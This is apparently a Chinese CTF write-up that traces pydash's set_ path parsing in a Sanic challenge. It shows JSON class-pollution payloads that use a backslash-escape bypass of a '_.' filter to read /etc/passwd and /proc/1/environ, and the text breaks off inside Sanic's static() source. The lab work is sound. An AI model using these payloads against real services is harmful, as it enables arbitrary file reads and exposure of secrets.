<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__.__globals__.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		然而，恭喜了，每过，被 forbidden 了。回去看看，破案了，admin 路由函数中存在这么一个比较： <code>if key and value and type(key) is str and '_.' not in key:</code> ，这个就卡住我了。先来看下这几行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure>
<p>​		似乎需要绕过的仅仅只有 key 中的  <code>'_.'</code>  字符串，那么，需要的就是对 key 进行操作的地方应该重点观察，所以，上面这个代码应该重点看一看，当然， 前面的所有都没有用，最有用的只有 <code>pydash.set_(pollute, key, value)</code> ，那么，没办法了，跟进 set_() 函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure>
<p>​		算是，好消息吧，直接就看到了 path，我们传入的 key 或许就是这个叫 path 的东西，毕竟那个链子看起来也很像是路径。好，没啥内容，跟进 <code>set_with(obj, path, value)</code> 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure>
<p>​		盯着 path，继续跟进：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure>
<p>​		继续跟进 path，似乎整个函数里就只有一个： <code>tokens = to_path_tokens(path)</code> ，还是无脑根：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		这儿不知道怎么操作了，但是跟进  <code>RE_PATH_KEY_DELIM</code>  后得到了个正则表达式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		问了下 ai，ai 的回复中有一点儿值得注意：</p>
<blockquote>
<p>请注意，这个正则表达式在处理复杂的转义序列时可能不是完美的，特别是当字符串中包含连续的转义字符（如  <code>\\\\.</code> ），这些字符可能意图表示一个实际的点号但前面有偶数个反斜杠。此外，如果点号后面紧跟的是字母或其他非数字字符，它仍然会被匹配为分隔符，即使这可能不是预期的。</p>
</blockquote>
<p>​		我个人已经别无他法了，照着它给的这个这 <code>\\\\.</code>  试着绕了一下，结果成功了，payload 如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		访问 src 路由，成功读取到了文件：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/550d038c156f4d6b8438ed492ff66ab8.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		好了，照理来说，这个题目如果这样的话已经成功了，利用如下 payload 直接读取进程的环境变量即可：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/proc/1/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://i-blog.csdnimg.cn/direct/a9da93b14d1f46dba7baadaca4c8ba51.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		但是，看了下大佬们的 wp 似乎有另一种姿势，算是一种非预期吧。</p>
<p><strong>下面跟着大佬们走：</strong></p>
<p>​		先看如下位置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure>
<p>​		跟进 static ()，得到如下内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    file_or_directory: <span class="type">Union</span>[PathLike, <span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    pattern: <span class="built_in">str</span> = <span class="string">r&quot;/?.+&quot;</span>,</span></span><br><span class="line"><span class="params">    use_modified_since: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    use_content_range: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    stream_large_files: <span class="type">Union</span>[<span class="built_in">bool</span>, <span class="built_in">int</span>] = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span> = <span class="string">&quot;static&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    strict_slashes: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    content_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    apply: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    resource_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    directory_handler: <span class="type">Optional</span>[DirectoryHandler] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a root to serve files from. The input can either be a file or a directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This method provides an easy and simple way to set up the route necessary to serve static files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        uri (str): URL path to be used for serving static content.</span></span><br><span class="line"><span class="string">        file_or_directory (Union[PathLike, str]): Path to the static file</span></span><br><span class="line"><span class="string">            or directory with static files.</span></span><br><span class="line"><span class="string">        pattern (str, optional): Regex pattern identifying the valid</span></span><br><span class="line"><span class="string">            static files. Defaults to `r&quot;/?.+&quot;`.</span></span><br><span class="line"><span class="string">        use_modified_since (bool, optional): If true, send file modified</span></span><br><span class="line"><span class="string">            time, and return not modified if the browser&#x27;s matches the</span></span><br><span class="line"><span class="string">            server&#x27;s. Defaults to `True`.</span></span><br><span class="line"><span class="string">        use_content_range (bool, optional): If true, process header for</span></span><br><span class="line"><span class="string">            range requests and sends  the file part that is requested.</span></span><br><span class="line"><span class="string">            Defaults to `False`.</span></span><br><span class="line"><span class="string">        stream_large_files (Union[bool, int], optional): If `True`, use</span></span><br><span class="line"><span class="string">            the `StreamingHTTPResponse.file_stream` handler rather than</span></span><br><span class="line"><span class="string">            the `HTTPResponse.file handler` to send the file. If this</span></span><br><span class="line"><span class="string">            is an integer, it represents the threshold size to switch</span></span><br><span class="line"><span class="string">            to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span></span><br><span class="line"><span class="string">            which means that the response will not be streamed.</span></span><br><span class="line"><span class="string">        name (str, optional): User-defined name used for url_for.</span></span><br><span class="line"><span class="string">            Defaults to `&quot;static&quot;`.</span></span><br><span class="line"><span class="string">        host (Optional[str], optional): Host IP or FQDN for the</span></span><br><span class="line"><span class="string">            service to use.</span></span><br><span class="line"><span class="string">        strict_slashes (Optional[bool], optional): Instruct Sanic to</span></span><br><span class="line"><span class="string">            check if the request URLs need to terminate with a slash.</span></span><br><span class="line"><span class="string">        content_type (Optional[str], optional): User-defined content type</span></span><br><span class="line"><span class="string">            for header.</span></span><br><span class="line"><span class="string">        apply (bool, optional): If true, will register the route</span></span><br><span class="line"><span class="string">            immediately. Defaults to `True`.</span></span><br><span class="line"><span class="string">        resource_type (Optional[str], optional): Explicitly declare a</span></span><br><span class="line"><span class="string">            resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span></span><br><span class="line"><span class="string">        index (Optional[Union[str, Sequence[str]]], optional): When</span></span><br><span class="line"><span class="string">            exposing against a directory, index is  the name that will</span></span><br><span class="line"><span class="string">            be served as the default file. When multiple file names are</span></span><br><span class="line"><span class="string">            passed, then they will be tried in order.</span></span><br><span class="line"><span class="string">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class="line"><span class="string">            the directory viewer when exposing a directory. Defaults</span></span><br><span class="line"><span class="string">            to `False`.</span></span><br><span class="line"><span class="string">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class="line"><span class="string">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class="line"><span class="string">            controlling and subclassing the behavior of the default</span></span><br><span class="line"><span class="string">            directory handler.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        List[sanic.router.Route]: Routes registered on the router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string">        Serving a single file:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        app.static(&#x27;/foo&#x27;, &#x27;path/to/static/file.txt&#x27;)</span></span><br></pre></td></tr></table></figure>
<pre><code>        Serving all files from a directory:
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/static/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>

        Serving large files with a specific threshold:
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/large/files&#x27;</span>, stream_large_files=<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>
    &quot;&quot;&quot;  # noqa: E501

    name = self.generate_name(name)

    if strict_slashes is None and self.strict_slashes is not None:
        strict_slashes = self.strict_slashes

    if not isinstance(file_or_directory, (str, bytes, PurePath)):
        raise ValueError(
            f&quot;Static route must be a valid path, not &#123;file_or_directory&#125;&quot;
        )

    try:
        file_or_directory = Path(file_or_directory).resolve()
    except TypeError:
        raise TypeError(
            &quot;Static file or directory must be a path-like object or string&quot;
        )

